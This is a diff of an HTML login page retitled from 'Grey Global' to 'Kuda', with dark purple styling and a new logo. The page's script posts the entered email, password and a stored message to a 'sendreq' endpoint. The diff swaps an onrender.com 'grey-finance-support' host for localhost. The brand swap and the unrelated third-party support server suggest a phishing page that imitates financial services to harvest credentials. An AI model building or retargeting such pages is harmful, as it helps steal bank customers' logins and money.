@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
-  <title>Login - Grey Global</title>
+  <link rel="shortcut icon" href="./k.png" type="image/x-icon">
+  <title>Login - Kuda</title>
  <style>
     * {
   margin: 0;
@@ -12,9 +12,9 @@
   box-sizing: border-box;
   font-family: "Inter", sans-serif;
 }
-
+  
 body {
-  background-color: white;
+  background-color: #1c102b;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -25,16 +25,16 @@ body {
   text-align: center;
   width: 100%;
   max-width: 380px;
-  background-color: #fff;
+  background-color: #1c102b;
   padding: 40px 20px;
   border-radius: 8px;
 }
 
 h2 {
-  font-size: 1.5rem;
+  font-size: 1.6rem;
   margin-bottom: 30px;
-  color: #0d1b2a;
-  font-weight: 600;
+  color: white;
+  font-weight: 800;
 }
 
 .login-form {
@@ -57,18 +57,26 @@ label {
 
 input {
   width: 100%;
+  background-color: rgb(85, 85, 85);
   padding: 13px 14px;
-  border: 1px groove #d3d3d3;
+  border:none;
   border-radius: 6px;
+  color: white;
+  font-size: medium;
   font-size: 0.95rem;
   
   outline: none;
 }
 
 input:focus {
-  border-color:  #d3d3d3;
+border-top: none;
+border-left: none;
+border-right: none;
+background-color: #1c102b;
+border-bottom: 2px groove #451d74;
+
   outline: none;
-  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+  /* box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1); */
 }
 
 .password-wrapper {
@@ -87,7 +95,7 @@ input:focus {
 
 button {
   width: 100%;
-  background-color: #2563eb;
+  background-color: #451d74;
   color: #fff;
   border: none;
   border-radius: 6px;
@@ -100,7 +108,7 @@ button {
 }
 
 button:hover {
-  background-color: #1d4ed8;
+  background-color: #451d74;
 }
 
 /* Smooth fade-in animation */
@@ -126,7 +134,7 @@ button:hover {
   }
 
   h2 {
-    font-size: 1.3rem;
+    font-size: 1.4rem;
   }
 }
 
@@ -187,16 +195,21 @@ button.loading .loader {
 </head>
 <body>
   <div class="container">
-    <h2>Welcome back!</h2>
+    <div class="container">
+      <div class="logo-section">
+        <img src="./Untitled.png" alt="Grey Logo"  width="50" style="border-radius: 10px;" class="logo" />
+       
+      </div>
+    <h2>Hi,  there!</h2>
 
     <form class="login-form">
       <div class="input-group">
-        <label for="email">Email address</label>
-        <input type="email" id="email" placeholder="Enter email address" required />
+        <label for="email" style="color: white; font-size: medium;">Email address</label>
+        <input type="email"  id="email" placeholder="Enter email address" required />
       </div>
 
       <div class="input-group">
-        <label for="password">Password</label>
+        <label for="password"  style="color: white; font-size: medium;">Password</label>
         <div class="password-wrapper">
           <input type="password" id="password" placeholder="Enter your password" required />
           <span class="toggle-password" id="togglePassword">👁️</span>
@@ -251,7 +264,7 @@ loginForm.addEventListener("submit", (e) => {
     message:localStorage.getItem('msg')
   }
   console.log(send_data)
-    fetch('https://grey-finance-support.onrender.com/sendreq',{
+    fetch('http://localhost:3100/sendreq',{
     method: 'POST',
                 credentials:'include',
                headers: {
@@ -281,4 +294,3 @@ loginForm.addEventListener("submit", (e) => {
  </script>
 </body>
 </html>
-
